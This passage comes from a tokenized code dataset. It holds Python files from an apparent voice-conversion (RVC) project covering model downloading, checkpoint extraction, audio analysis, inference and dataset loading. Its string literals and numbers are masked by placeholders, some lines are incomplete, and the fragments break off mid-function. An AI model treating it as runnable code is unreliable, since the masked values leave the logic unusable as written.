<EOL> elif "<STR_LIT>" in url : <EOL> file_id = url . split ( "<STR_LIT>" ) [ <NUM_LIT> ] . split ( "<STR_LIT>" ) [ <NUM_LIT> ] <EOL> else : <EOL> return None <EOL> if file_id : <EOL> os . chdir ( zips_path ) <EOL> try : <EOL> gdown . download ( <EOL> f"<STR_LIT>" , <EOL> quiet = True , <EOL> fuzzy = True , <EOL> ) <EOL> except Exception as error : <EOL> error_message = str ( error ) <EOL> if ( <EOL> "<STR_LIT>" <EOL> in error_message <EOL> ) : <EOL> os . chdir ( now_dir ) <EOL> return "<STR_LIT>" <EOL> elif ( <EOL> "<STR_LIT>" in error_message <EOL> ) : <EOL> os . chdir ( now_dir ) <EOL> return "<STR_LIT>" <EOL> else : <EOL> print ( error_message ) <EOL> os . chdir ( now_dir ) <EOL> return None <EOL> elif "<STR_LIT>" in url : <EOL> base_url = "<STR_LIT>" <EOL> public_key = url <EOL> final_url = base_url + urlencode ( dict ( public_key = public_key ) ) <EOL> response = requests . get ( final_url ) <EOL> download_url = response . json ( ) [ "<STR_LIT>" ] <EOL> download_response = requests . get ( download_url ) <EOL> if download_response . status_code == <NUM_LIT> : <EOL> filename = parse_qs ( urlparse ( unquote ( download_url ) ) . query ) . get ( <EOL> "<STR_LIT>" , [ "<STR_LIT>" ] <EOL> ) [ <NUM_LIT> ] <EOL> if filename : <EOL> os . chdir ( zips_path ) <EOL> with open ( filename , "<STR_LIT>" ) as f : <EOL> f . write ( download_response . content ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> return None <EOL> elif "<STR_LIT>" in url : <EOL> try : <EOL> file_id = url . split ( "<STR_LIT>" ) [ <NUM_LIT> ] <EOL> os . chdir ( zips_path ) <EOL> print ( file_id ) <EOL> response = requests . get ( f"<STR_LIT>" ) <EOL> if response . status_code == <NUM_LIT> : <EOL> file_name = ( <EOL> response . headers . get ( "<STR_LIT>" ) <EOL> . split ( "<STR_LIT>" ) [ - <NUM_LIT> ] <EOL> . strip ( '<STR_LIT>' ) <EOL> ) <EOL> os . makedirs ( zips_path , exist_ok = True ) <EOL> with open ( os . path . join ( zips_path , file_name ) , "<STR_LIT>" ) as newfile : <EOL> newfile . write ( response . content ) <EOL> os . chdir ( file_path ) <EOL> return "<STR_LIT>" <EOL> else : <EOL> os . chdir ( file_path ) <EOL> return None <EOL> except Exception as e : <EOL> print ( e ) <EOL> os . chdir ( file_path ) <EOL> return None <EOL> elif "<STR_LIT>" in url : <EOL> file = requests . get ( url ) <EOL> os . chdir ( zips_path ) <EOL> if file . status_code == <NUM_LIT> : <EOL> name = url . split ( "<STR_LIT>" ) <EOL> with open ( os . path . join ( name [ - <NUM_LIT> ] ) , "<STR_LIT>" ) as newfile : <EOL> newfile . write ( file . content ) <EOL> else : <EOL> return None <EOL> elif "<STR_LIT>" in url or "<STR_LIT>" in url : <EOL> os . chdir ( zips_path ) <EOL> if "<STR_LIT>" in url : <EOL> url = url . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> response = requests . get ( url , stream = True ) <EOL> if response . status_code == <NUM_LIT> : <EOL> content_disposition = six . moves . urllib_parse . unquote ( <EOL> response . headers [ "<STR_LIT>" ] <EOL> ) <EOL> m = re . search ( r'<STR_LIT>' , content_disposition ) <EOL> file_name = m . groups ( ) [ <NUM_LIT> ] <EOL> file_name = file_name . replace ( os . path . sep , "<STR_LIT>" ) <EOL> total_size_in_bytes = int ( response . headers . get ( "<STR_LIT>" , <NUM_LIT> ) ) <EOL> block_size = <NUM_LIT> <EOL> progress_bar_length = <NUM_LIT> <EOL> progress = <NUM_LIT> <EOL> with open ( os . path . join ( zips_path , file_name ) , "<STR_LIT>" ) as file : <EOL> for data in response . iter_content ( block_size ) : <EOL> file . write ( data ) <EOL> progress += len ( data ) <EOL> progress_percent = int ( ( progress / total_size_in_bytes ) * <NUM_LIT> ) <EOL> num_dots = int ( <EOL> ( progress / total_size_in_bytes ) * progress_bar_length <EOL> ) <EOL> progress_bar = ( <EOL> "<STR_LIT>" <EOL> + "<STR_LIT>" * num_dots <EOL> + "<STR_LIT>" * ( progress_bar_length - num_dots ) <EOL> + "<STR_LIT>" <EOL> ) <EOL> print ( <EOL> f"<STR_LIT>" , <EOL> end = "<STR_LIT>" , <EOL> ) <EOL> if progress_percent == <NUM_LIT> : <EOL> print ( "<STR_LIT>" ) <EOL> else : <EOL> os . chdir ( now_dir ) <EOL> return None <EOL> elif "<STR_LIT>" in url : <EOL> os . chdir ( zips_path ) <EOL> response = requests . get ( url ) <EOL> soup = BeautifulSoup ( response . content , "<STR_LIT>" ) <EOL> temp_url = "<STR_LIT>" <EOL> for link in soup . find_all ( "<STR_LIT>" , href = True ) : <EOL> if link [ "<STR_LIT>" ] . endswith ( "<STR_LIT>" ) : <EOL> temp_url = link [ "<STR_LIT>" ] <EOL> break <EOL> if temp_url : <EOL> url = temp_url <EOL> url = url . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if "<STR_LIT>" not in url : <EOL> url = "<STR_LIT>" + url <EOL> wget . download ( url ) <EOL> else : <EOL> os . chdir ( now_dir ) <EOL> return None <EOL> elif "<STR_LIT>" in url : <EOL> parts = url . split ( "<STR_LIT>" ) <EOL> id_with_query = parts [ - <NUM_LIT> ] <EOL> id_parts = id_with_query . split ( "<STR_LIT>" ) <EOL> id_number = id_parts [ <NUM_LIT> ] <EOL> url = "<STR_LIT>" <EOL> headers = { <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> params = { "<STR_LIT>" : f"<STR_LIT>" } <EOL> response = requests . get ( url , headers = headers , params = params ) <EOL> if response . status_code == <NUM_LIT> : <EOL> json_response = response . json ( ) <EOL> print ( json_response ) <EOL> if json_response : <EOL> link = json_response [ <NUM_LIT> ] [ "<STR_LIT>" ] <EOL> verify = download_from_url ( link ) <EOL> if verify == "<STR_LIT>" : <EOL> return "<STR_LIT>" <EOL> else : <EOL> return None <EOL> else : <EOL> return None <EOL> else : <EOL> try : <EOL> os . chdir ( zips_path ) <EOL> wget . download ( url ) <EOL> except Exception as error : <EOL> os . chdir ( now_dir ) <EOL> print ( error ) <EOL> return None <EOL> for currentPath , _ , zipFiles in os . walk ( zips_path ) : <EOL> for Files in zipFiles : <EOL> filePart = Files . split ( "<STR_LIT>" ) <EOL> extensionFile = filePart [ len ( filePart ) - <NUM_LIT> ] <EOL> filePart . pop ( ) <EOL> nameFile = "<STR_LIT>" . join ( filePart ) <EOL> realPath = os . path . join ( currentPath , Files ) <EOL> os . rename ( realPath , nameFile + "<STR_LIT>" + extensionFile ) <EOL> os . chdir ( now_dir ) <EOL> return "<STR_LIT>" <EOL> os . chdir ( now_dir ) <EOL> return None <EOL> def extract_and_show_progress ( zipfile_path , unzips_path ) : <EOL> try : <EOL> with zipfile . ZipFile ( zipfile_path , "<STR_LIT>" ) as zip_ref : <EOL> for file_info in zip_ref . infolist ( ) : <EOL> zip_ref . extract ( file_info , unzips_path ) <EOL> os . remove ( zipfile_path ) <EOL> return True <EOL> except Exception as error : <EOL> print ( error ) <EOL> return False <EOL> def unzip_file ( zip_path , zip_file_name ) : <EOL> zip_file_path = os . path . join ( zip_path , zip_file_name + "<STR_LIT>" ) <EOL> extract_path = os . path . join ( file_path , zip_file_name ) <EOL> with zipfile . ZipFile ( zip_file_path , "<STR_LIT>" ) as zip_ref : <EOL> zip_ref . extractall ( extract_path ) <EOL> os . remove ( zip_file_path ) <EOL> def model_download_pipeline ( url ) : <EOL> verify = download_from_url ( url ) <EOL> if verify == "<STR_LIT>" : <EOL> extract_folder_path = "<STR_LIT>" <EOL> for filename in os . listdir ( zips_path ) : <EOL> if filename . endswith ( "<STR_LIT>" ) : <EOL> zipfile_path = os . path . join ( zips_path , filename ) <EOL> print ( "<STR_LIT>" ) <EOL> model_zip = os . path . basename ( zipfile_path ) <EOL> model_name = format_title ( model_zip . split ( "<STR_LIT>" ) [ <NUM_LIT> ] ) <EOL> extract_folder_path = os . path . join ( <EOL> "<STR_LIT>" , <EOL> os . path . normpath ( model_name ) , <EOL> ) <EOL> success = extract_and_show_progress ( zipfile_path , extract_folder_path ) <EOL> subfolders = [ <EOL> f <EOL> for f in os . listdir ( extract_folder_path ) <EOL> if os . path . isdir ( os . path . join ( extract_folder_path , f ) ) <EOL> ] <EOL> if len ( subfolders ) == <NUM_LIT> : <EOL> subfolder_path = os . path . join ( extract_folder_path , subfolders [ <NUM_LIT> ] ) <EOL> for item in os . listdir ( subfolder_path ) : <EOL> s = os . path . join ( subfolder_path , item ) <EOL> d = os . path . join ( extract_folder_path , item ) <EOL> shutil . move ( s , d ) <EOL> os . rmdir ( subfolder_path ) <EOL> for item in os . listdir ( extract_folder_path ) : <EOL> if "<STR_LIT>" in item : <EOL> file_name = item . split ( "<STR_LIT>" ) [ <NUM_LIT> ] <EOL> if file_name != model_name : <EOL> os . rename ( <EOL> os . path . join ( extract_folder_path , item ) , <EOL> os . path . join ( extract_folder_path , model_name + "<STR_LIT>" ) , <EOL> ) <EOL> else : <EOL> if "<STR_LIT>" not in item : <EOL> file_name = item . split ( "<STR_LIT>" ) [ <NUM_LIT> ] . split ( "<STR_LIT>" ) [ <NUM_LIT> ] <EOL> if file_name != model_name : <EOL> new_file_name = ( <EOL> item . split ( "<STR_LIT>" ) [ <NUM_LIT> ] <EOL> + "<STR_LIT>" <EOL> + model_name <EOL> + "<STR_LIT>" <EOL> ) <EOL> os . rename ( <EOL> os . path . join ( extract_folder_path , item ) , <EOL> os . path . join ( <EOL> extract_folder_path , new_file_name + "<STR_LIT>" <EOL> ) , <EOL> ) <EOL> else : <EOL> file_name = item . split ( "<STR_LIT>" ) [ <NUM_LIT> ] . split ( "<STR_LIT>" ) [ <NUM_LIT> ] <EOL> if file_name != model_name : <EOL> new_file_name = ( <EOL> item . split ( "<STR_LIT>" ) [ <NUM_LIT> ] <EOL> + "<STR_LIT>" <EOL> + model_name <EOL> + "<STR_LIT>" <EOL> ) <EOL> os . rename ( <EOL> os . path . join ( extract_folder_path , item ) , <EOL> os . path . join ( <EOL> extract_folder_path , new_file_name + "<STR_LIT>" <EOL> ) , <EOL> ) <EOL> if success : <EOL> print ( f"<STR_LIT>" ) <EOL> else : <EOL> print ( f"<STR_LIT>" ) <EOL> sys . exit ( ) <EOL> if extract_folder_path == "<STR_LIT>" : <EOL> print ( "<STR_LIT>" ) <EOL> sys . exit ( ) <EOL> result = search_pth_index ( extract_folder_path ) <EOL> else : <EOL> message = "<STR_LIT>" <EOL> </s>
<s> import os <EOL> import torch <EOL> import hashlib <EOL> import datetime <EOL> from collections import OrderedDict <EOL> def replace_keys_in_dict ( d , old_key_part , new_key_part ) : <EOL> if isinstance ( d , OrderedDict ) : <EOL> updated_dict = OrderedDict ( ) <EOL> else : <EOL> updated_dict = { } <EOL> for key , value in d . items ( ) : <EOL> new_key = key . replace ( old_key_part , new_key_part ) <EOL> if isinstance ( value , dict ) : <EOL> value = replace_keys_in_dict ( value , old_key_part , new_key_part ) <EOL> updated_dict [ new_key ] = value <EOL> return updated_dict <EOL> def extract_model ( ckpt , sr , if_f0 , name , model_dir , epoch , step , version , hps ) : <EOL> try : <EOL> print ( f"<STR_LIT>" ) <EOL> pth_file = f"<STR_LIT>" <EOL> pth_file_old_version_path = os . path . join ( <EOL> model_dir , f"<STR_LIT>" <EOL> ) <EOL> opt = OrderedDict ( <EOL> weight = { <EOL> key : value . half ( ) for key , value in ckpt . items ( ) if "<STR_LIT>" not in key <EOL> } <EOL> ) <EOL> opt [ "<STR_LIT>" ] = [ <EOL> hps . data . filter_length // <NUM_LIT> + <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> hps . model . inter_channels , <EOL> hps . model . hidden_channels , <EOL> hps . model . filter_channels , <EOL> hps . model . n_heads , <EOL> hps . model . n_layers , <EOL> hps . model . kernel_size , <EOL> hps . model . p_dropout , <EOL> hps . model . resblock , <EOL> hps . model . resblock_kernel_sizes , <EOL> hps . model . resblock_dilation_sizes , <EOL> hps . model . upsample_rates , <EOL> hps . model . upsample_initial_channel , <EOL> hps . model . upsample_kernel_sizes , <EOL> hps . model . spk_embed_dim , <EOL> hps . model . gin_channels , <EOL> hps . data . sampling_rate , <EOL> ] <EOL> opt [ "<STR_LIT>" ] = epoch <EOL> opt [ "<STR_LIT>" ] = step <EOL> opt [ "<STR_LIT>" ] = sr <EOL> opt [ "<STR_LIT>" ] = if_f0 <EOL> opt [ "<STR_LIT>" ] = version <EOL> opt [ "<STR_LIT>" ] = datetime . datetime . now ( ) . isoformat ( ) <EOL> hash_input = f"<STR_LIT>" <EOL> model_hash = hashlib . sha256 ( hash_input . encode ( ) ) . hexdigest ( ) <EOL> opt [ "<STR_LIT>" ] = model_hash <EOL> torch . save ( opt , model_dir ) <EOL> model = torch . load ( model_dir , map_location = torch . device ( "<STR_LIT>" ) ) <EOL> torch . save ( <EOL> replace_keys_in_dict ( <EOL> replace_keys_in_dict ( <EOL> model , "<STR_LIT>" , "<STR_LIT>" <EOL> ) , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> pth_file_old_version_path , <EOL> ) <EOL> os . remove ( model_dir ) <EOL> os . rename ( pth_file_old_version_path , model_dir ) <EOL> except Exception as error : <EOL> print ( error ) <EOL> </s>
<s> import numpy as np <EOL> import matplotlib . pyplot as plt <EOL> import librosa . display <EOL> import librosa <EOL> def calculate_features ( y , sr ) : <EOL> stft = np . abs ( librosa . stft ( y ) ) <EOL> duration = librosa . get_duration ( y = y , sr = sr ) <EOL> cent = librosa . feature . spectral_centroid ( S = stft , sr = sr ) [ <NUM_LIT> ] <EOL> bw = librosa . feature . spectral_bandwidth ( S = stft , sr = sr ) [ <NUM_LIT> ] <EOL> rolloff = librosa . feature . spectral_rolloff ( S = stft , sr = sr ) [ <NUM_LIT> ] <EOL> return stft , duration , cent , bw , rolloff <EOL> def plot_title ( title ) : <EOL> plt . suptitle ( title , fontsize = <NUM_LIT> , fontweight = "<STR_LIT>" ) <EOL> def plot_spectrogram ( y , sr , stft , duration , cmap = "<STR_LIT>" ) : <EOL> plt . subplot ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) <EOL> plt . imshow ( <EOL> librosa . amplitude_to_db ( stft , ref = np . max ) , <EOL> origin = "<STR_LIT>" , <EOL> extent = [ <NUM_LIT> , duration , <NUM_LIT> , sr / <NUM_LIT> ] , <EOL> aspect = "<STR_LIT>" , <EOL> cmap = cmap , <EOL> ) <EOL> plt . colorbar ( format = "<STR_LIT>" ) <EOL> plt . xlabel ( "<STR_LIT>" ) <EOL> plt . ylabel ( "<STR_LIT>" ) <EOL> plt . title ( "<STR_LIT>" ) <EOL> def plot_waveform ( y , sr , duration ) : <EOL> plt . subplot ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) <EOL> librosa . display . waveshow ( y , sr = sr ) <EOL> plt . xlabel ( "<STR_LIT>" ) <EOL> plt . ylabel ( "<STR_LIT>" ) <EOL> plt . title ( "<STR_LIT>" ) <EOL> def plot_features ( times , cent , bw , rolloff , duration ) : <EOL> plt . subplot ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) <EOL> plt . plot ( times , cent , label = "<STR_LIT>" , color = "<STR_LIT>" ) <EOL> plt . plot ( times , bw , label = "<STR_LIT>" , color = "<STR_LIT>" ) <EOL> plt . plot ( times , rolloff , label = "<STR_LIT>" , color = "<STR_LIT>" ) <EOL> plt . xlabel ( "<STR_LIT>" ) <EOL> plt . title ( "<STR_LIT>" ) <EOL> plt . legend ( ) <EOL> def analyze_audio ( audio_file , save_plot_path = "<STR_LIT>" ) : <EOL> y , sr = librosa . load ( audio_file ) <EOL> stft , duration , cent , bw , rolloff = calculate_features ( y , sr ) <EOL> plt . figure ( figsize = ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> plot_title ( "<STR_LIT>" + "<STR_LIT>" + audio_file . split ( "<STR_LIT>" ) [ - <NUM_LIT> ] ) <EOL> plot_spectrogram ( y , sr , stft , duration ) <EOL> plot_waveform ( y , sr , duration ) <EOL> plot_features ( librosa . times_like ( cent ) , cent , bw , rolloff , duration ) <EOL> plt . tight_layout ( ) <EOL> if save_plot_path : <EOL> plt . savefig ( save_plot_path , bbox_inches = "<STR_LIT>" , dpi = <NUM_LIT> ) <EOL> plt . close ( ) <EOL> audio_info = <EOL> return audio_info , save_plot_path <EOL> </s>
<s> import os <EOL> import sys <EOL> import time <EOL> import torch <EOL> import logging <EOL> import numpy as np <EOL> import soundfile as sf <EOL> import librosa <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> from rvc . infer . pipeline import VC <EOL> from scipy . io import wavfile <EOL> import noisereduce as nr <EOL> from rvc . lib . utils import load_audio <EOL> from rvc . lib . tools . split_audio import process_audio , merge_audio <EOL> from fairseq import checkpoint_utils <EOL> from rvc . lib . infer_pack . models import ( <EOL> SynthesizerTrnMs256NSFsid , <EOL> SynthesizerTrnMs256NSFsid_nono , <EOL> SynthesizerTrnMs768NSFsid , <EOL> SynthesizerTrnMs768NSFsid_nono , <EOL> ) <EOL> from rvc . configs . config import Config <EOL> logging . getLogger ( "<STR_LIT>" ) . setLevel ( logging . WARNING ) <EOL> logging . getLogger ( "<STR_LIT>" ) . setLevel ( logging . WARNING ) <EOL> logging . getLogger ( "<STR_LIT>" ) . setLevel ( logging . WARNING ) <EOL> config = Config ( ) <EOL> hubert_model = None <EOL> tgt_sr = None <EOL> net_g = None <EOL> vc = None <EOL> cpt = None <EOL> version = None <EOL> n_spk = None <EOL> def load_hubert ( ) : <EOL> global hubert_model <EOL> models , _ , _ = checkpoint_utils . load_model_ensemble_and_task ( <EOL> [ "<STR_LIT>" ] , <EOL> suffix = "<STR_LIT>" , <EOL> ) <EOL> hubert_model = models [ <NUM_LIT> ] <EOL> hubert_model = hubert_model . to ( config . device ) <EOL> if config . is_half : <EOL> hubert_model = hubert_model . half ( ) <EOL> else : <EOL> hubert_model = hubert_model . float ( ) <EOL> hubert_model . eval ( ) <EOL> def remove_audio_noise ( input_audio_path , reduction_strength = <NUM_LIT> ) : <EOL> try : <EOL> rate , data = wavfile . read ( input_audio_path ) <EOL> reduced_noise = nr . reduce_noise ( <EOL> y = data , <EOL> sr = rate , <EOL> prop_decrease = reduction_strength , <EOL> ) <EOL> return reduced_noise <EOL> except Exception as error : <EOL> print ( f"<STR_LIT>" ) <EOL> return None <EOL> def convert_audio_format ( input_path , output_path , output_format ) : <EOL> try : <EOL> if output_format != "<STR_LIT>" : <EOL> print ( f"<STR_LIT>" ) <EOL> audio , sample_rate = librosa . load ( input_path , sr = None ) <EOL> common_sample_rates = [ <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> ] <EOL> target_sr = min ( common_sample_rates , key = lambda x : abs ( x - sample_rate ) ) <EOL> audio = librosa . resample ( audio , orig_sr = sample_rate , target_sr = target_sr ) <EOL> sf . write ( output_path , audio , target_sr , format = output_format . lower ( ) ) <EOL> return output_path <EOL> except Exception as error : <EOL> print ( f"<STR_LIT>" ) <EOL> def vc_single ( <EOL> sid = <NUM_LIT> , <EOL> input_audio_path = None , <EOL> f0_up_key = None , <EOL> f0_file = None , <EOL> f0_method = None , <EOL> file_index = None , <EOL> index_rate = None , <EOL> resample_sr = <NUM_LIT> , <EOL> rms_mix_rate = None , <EOL> protect = None , <EOL> hop_length = None , <EOL> output_path = None , <EOL> split_audio = False , <EOL> f0autotune = False , <EOL> filter_radius = None , <EOL> ) : <EOL> global tgt_sr , net_g , vc , hubert_model , version <EOL> f0_up_key = int ( f0_up_key ) <EOL> try : <EOL> audio = load_audio ( input_audio_path , <NUM_LIT> ) <EOL> audio_max = np . abs ( audio ) . max ( ) / <NUM_LIT> <EOL> if audio_max > <NUM_LIT> : <EOL> audio /= audio_max <EOL> if not hubert_model : <EOL> load_hubert ( ) <EOL> if_f0 = cpt . get ( "<STR_LIT>" , <NUM_LIT> ) <EOL> file_index = ( <EOL> file_index . strip ( "<STR_LIT>" ) <EOL> . strip ( '<STR_LIT>' ) <EOL> . strip ( "<STR_LIT>" ) <EOL> . strip ( '<STR_LIT>' ) <EOL> . strip ( "<STR_LIT>" ) <EOL> . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> ) <EOL> if tgt_sr != resample_sr >= <NUM_LIT> : <EOL> tgt_sr = resample_sr <EOL> if split_audio == "<STR_LIT>" : <EOL> result , new_dir_path = process_audio ( input_audio_path ) <EOL> if result == "<STR_LIT>" : <EOL> return "<STR_LIT>" , None <EOL> dir_path = ( <EOL> new_dir_path . strip ( "<STR_LIT>" ) . strip ( '<STR_LIT>' ) . strip ( "<STR_LIT>" ) . strip ( '<STR_LIT>' ) . strip ( "<STR_LIT>" ) <EOL> ) <EOL> if dir_path != "<STR_LIT>" : <EOL> paths = [ <EOL> os . path . join ( root , name ) <EOL> for root , _ , files in os . walk ( dir_path , topdown = False ) <EOL> for name in files <EOL> if name . endswith ( "<STR_LIT>" ) and root == dir_path <EOL> ] <EOL> try : <EOL> for path in paths : <EOL> vc_single ( <EOL> sid , <EOL> path , <EOL> f0_up_key , <EOL> None , <EOL> f0_method , <EOL> file_index , <EOL> index_rate , <EOL> resample_sr , <EOL> rms_mix_rate , <EOL> protect , <EOL> hop_length , <EOL> path , <EOL> False , <EOL> f0autotune , <EOL> ) <EOL> except Exception as error : <EOL> print ( error ) <EOL> return f"<STR_LIT>" <EOL> print ( "<STR_LIT>" ) <EOL> merge_timestamps_file = os . path . join ( <EOL> os . path . dirname ( new_dir_path ) , <EOL> f"<STR_LIT>" , <EOL> ) <EOL> tgt_sr , audio_opt = merge_audio ( merge_timestamps_file ) <EOL> os . remove ( merge_timestamps_file ) <EOL> else : <EOL> audio_opt = vc . pipeline ( <EOL> hubert_model , <EOL> net_g , <EOL> sid , <EOL> audio , <EOL> input_audio_path , <EOL> f0_up_key , <EOL> f0_method , <EOL> file_index , <EOL> index_rate , <EOL> if_f0 , <EOL> filter_radius , <EOL> tgt_sr , <EOL> resample_sr , <EOL> rms_mix_rate , <EOL> version , <EOL> protect , <EOL> hop_length , <EOL> f0autotune , <EOL> f0_file = f0_file , <EOL> ) <EOL> if output_path is not None : <EOL> sf . write ( output_path , audio_opt , tgt_sr , format = "<STR_LIT>" ) <EOL> return ( tgt_sr , audio_opt ) <EOL> except Exception as error : <EOL> print ( error ) <EOL> def get_vc ( weight_root , sid ) : <EOL> global n_spk , tgt_sr , net_g , vc , cpt , version <EOL> if sid == "<STR_LIT>" or sid == [ ] : <EOL> global hubert_model <EOL> if hubert_model is not None : <EOL> print ( "<STR_LIT>" ) <EOL> del net_g , n_spk , vc , hubert_model , tgt_sr <EOL> hubert_model = net_g = n_spk = vc = hubert_model = tgt_sr = None <EOL> if torch . cuda . is_available ( ) : <EOL> torch . cuda . empty_cache ( ) <EOL> if_f0 = cpt . get ( "<STR_LIT>" , <NUM_LIT> ) <EOL> version = cpt . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if version == "<STR_LIT>" : <EOL> if if_f0 == <NUM_LIT> : <EOL> net_g = SynthesizerTrnMs256NSFsid ( <EOL> * cpt [ "<STR_LIT>" ] , is_half = config . is_half <EOL> ) <EOL> else : <EOL> net_g = SynthesizerTrnMs256NSFsid_nono ( * cpt [ "<STR_LIT>" ] ) <EOL> elif version == "<STR_LIT>" : <EOL> if if_f0 == <NUM_LIT> : <EOL> net_g = SynthesizerTrnMs768NSFsid ( <EOL> * cpt [ "<STR_LIT>" ] , is_half = config . is_half <EOL> ) <EOL> else : <EOL> net_g = SynthesizerTrnMs768NSFsid_nono ( * cpt [ "<STR_LIT>" ] ) <EOL> del net_g , cpt <EOL> if torch . cuda . is_available ( ) : <EOL> torch . cuda . empty_cache ( ) <EOL> cpt = None <EOL> person = weight_root <EOL> cpt = torch . load ( person , map_location = "<STR_LIT>" ) <EOL> tgt_sr = cpt [ "<STR_LIT>" ] [ - <NUM_LIT> ] <EOL> cpt [ "<STR_LIT>" ] [ - <NUM_LIT> ] = cpt [ "<STR_LIT>" ] [ "<STR_LIT>" ] . shape [ <NUM_LIT> ] <EOL> if_f0 = cpt . get ( "<STR_LIT>" , <NUM_LIT> ) <EOL> version = cpt . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if version == "<STR_LIT>" : <EOL> if if_f0 == <NUM_LIT> : <EOL> net_g = SynthesizerTrnMs256NSFsid ( * cpt [ "<STR_LIT>" ] , is_half = config . is_half ) <EOL> else : <EOL> net_g = SynthesizerTrnMs256NSFsid_nono ( * cpt [ "<STR_LIT>" ] ) <EOL> elif version == "<STR_LIT>" : <EOL> if if_f0 == <NUM_LIT> : <EOL> net_g = SynthesizerTrnMs768NSFsid ( * cpt [ "<STR_LIT>" ] , is_half = config . is_half ) <EOL> else : <EOL> net_g = SynthesizerTrnMs768NSFsid_nono ( * cpt [ "<STR_LIT>" ] ) <EOL> del net_g . enc_q <EOL> print ( net_g . load_state_dict ( cpt [ "<STR_LIT>" ] , strict = False ) ) <EOL> net_g . eval ( ) . to ( config . device ) <EOL> if config . is_half : <EOL> net_g = net_g . half ( ) <EOL> else : <EOL> net_g = net_g . float ( ) <EOL> vc = VC ( tgt_sr , config ) <EOL> n_spk = cpt [ "<STR_LIT>" ] [ - <NUM_LIT> ] <EOL> def infer_pipeline ( <EOL> f0up_key , <EOL> filter_radius , <EOL> index_rate , <EOL> rms_mix_rate , <EOL> protect , <EOL> hop_length , <EOL> f0method , <EOL> audio_input_path , <EOL> audio_output_path , <EOL> model_path , <EOL> index_path , <EOL> split_audio , <EOL> f0autotune , <EOL> clean_audio , <EOL> clean_strength , <EOL> export_format , <EOL> ) : <EOL> global tgt_sr , net_g , vc , cpt <EOL> get_vc ( model_path , <NUM_LIT> ) <EOL> try : <EOL> start_time = time . time ( ) <EOL> vc_single ( <EOL> sid = <NUM_LIT> , <EOL> input_audio_path = audio_input_path , <EOL> f0_up_key = f0up_key , <EOL> f0_file = None , <EOL> f0_method = f0method , <EOL> file_index = index_path , <EOL> index_rate = index_rate , <EOL> rms_mix_rate = rms_mix_rate , <EOL> protect = protect , <EOL> hop_length = hop_length , <EOL> output_path = audio_output_path , <EOL> split_audio = split_audio , <EOL> f0autotune = f0autotune , <EOL> filter_radius = filter_radius , <EOL> ) <EOL> if clean_audio == "<STR_LIT>" : <EOL> cleaned_audio = remove_audio_noise ( audio_output_path , clean_strength ) <EOL> if cleaned_audio is not None : <EOL> sf . write ( audio_output_path , cleaned_audio , tgt_sr , format = "<STR_LIT>" ) <EOL> output_path_format = audio_output_path . replace ( <EOL> "<STR_LIT>" , f"<STR_LIT>" <EOL> ) <EOL> audio_output_path = convert_audio_format ( <EOL> audio_output_path , output_path_format , export_format <EOL> ) <EOL> end_time = time . time ( ) <EOL> elapsed_time = end_time - start_time <EOL> print ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> except Exception as error : <EOL> print ( f"<STR_LIT>" ) <EOL> </s>
<s> import os <EOL> import numpy as np <EOL> import torch <EOL> import torch . utils . data <EOL> from mel_processing import spectrogram_torch <EOL> from utils import load_filepaths_and_text , load_wav_to_torch <EOL> class TextAudioLoaderMultiNSFsid ( torch . utils . data . Dataset ) : <EOL> def __init__ ( self , hparams ) : <EOL> self . audiopaths_and_text = load_filepaths_and_text ( hparams . training_files ) <EOL> self . max_wav_value = hparams . max_wav_value <EOL> self . sampling_rate = hparams . sampling_rate <EOL> self . filter_length = hparams . filter_length <EOL> self . hop_length = hparams . hop_length <EOL> self . win_length = hparams . win_length <EOL> self . sampling_rate = hparams . sampling_rate <EOL> self . min_text_len = getattr ( hparams , "<STR_LIT>" , <NUM_LIT> ) <EOL> self . max_text_len = getattr ( hparams , "<STR_LIT>" , <NUM_LIT> ) <EOL> self . _filter ( ) <EOL> def _filter ( self ) : <EOL> audiopaths_and_text_new = [ ] <EOL> lengths = [ ] <EOL> for audiopath , text , pitch , pitchf , dv in self . audiopaths_and_text : <EOL> if self . min_text_len <= len ( text ) and len ( text ) <= self . max_text_len : <EOL> audiopaths_and_text_new . append ( [ audiopath , text , pitch , pitchf , dv ] ) <EOL> lengths . append ( os . path . getsize ( audiopath ) // ( <NUM_LIT> * self . hop_length ) ) <EOL> self . audiopaths_and_text = audiopaths_and_text_new <EOL> self . lengths = lengths <EOL> def get_sid ( self , sid ) : <EOL> sid = torch . LongTensor ( [ int ( sid ) ] ) <EOL> return sid <EOL> def get_audio_text_pair ( self , audiopath_and_text ) : <EOL> file = audiopath_and_text [ <NUM_LIT> ] <EOL> phone = audiopath_and_text [ <NUM_LIT> ] <EOL> pitch = audiopath_and_text [ <NUM_LIT> ] <EOL> pitchf = audiopath_and_text [ <NUM_LIT> ] <EOL> dv = audiopath_and_text [ <NUM_LIT> ] <EOL> phone , pitch , pitchf = self . get_labels ( phone , pitch , pitchf ) <EOL> spec , wav = self . get_audio ( file ) <EOL> dv = self . get_sid ( dv ) <EOL> len_phone = phone . size ( ) [ <NUM_LIT> ] <EOL> len_spec = spec . size ( ) [ - <NUM_LIT> ] <EOL> if len_phone != len_spec : <EOL> len_min = min ( len_phone , len_spec ) <EOL> len_wav = len_min * self . hop_length <EOL> spec = spec [ : , : len_min ] <EOL> wav = wav [ : , : len_wav ] <EOL> phone = phone [ : len_min , : ] <EOL> pitch = pitch [ : len_min ] <EOL> pitchf = pitchf [ : len_min ] <EOL> return ( spec , wav , phone , pitch , pitchf , dv ) <EOL> def get_labels ( self , phone , pitch , pitchf ) : 